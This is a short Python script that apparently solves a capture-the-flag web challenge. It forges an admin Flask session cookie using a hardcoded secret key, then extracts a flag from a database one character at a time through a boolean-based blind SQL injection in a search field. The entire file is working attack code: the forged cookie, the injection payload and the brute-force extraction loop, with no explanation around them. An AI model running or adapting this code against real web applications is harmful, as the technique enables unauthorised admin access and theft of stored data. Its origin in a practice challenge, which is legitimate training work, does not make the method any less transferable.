import requests
from flask_session_cookie_manager3 import FSCM

admin_cookie = FSCM.encode("sRo79A9GrM", '{"admin":"true"}')
url = "http://websec.srdnlen.it:7074/admin"
headers = {
    "Host": "websec.srdnlen.it:7074",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
                  "Chrome/108.0.5359.125 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,"
              "/;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "Referer": "http://websec.srdnlen.it:7074/admin",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7",
    "Cookie": f"session={admin_cookie}",
    "Connection": "close"
}
r = requests.get(url, headers=headers)


def inject(url, payload):
    r = requests.post(url, headers=headers, data=payload)
    if "Search result: User exists" in r.text:
        return True
    else:
        return False


def guess_char(url, position, name):
    for c in "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!£$%&/()=?[]@#{}-.,_:;":

        payload = {'search': "Pysu' and SUBSTR((select theflag from flag LIMIT 1),1,{})='{}".format(position, name + c)}
        if inject(url, payload):
            return c


def guess_flag(url):
    flag = ""
    position = 1
    while True:
        c = guess_char(url, position, flag)
        if c is None:
            return flag
        flag += c
        print(flag)
        position += 1


flag = guess_flag(url)
print("The flag is:", flag)
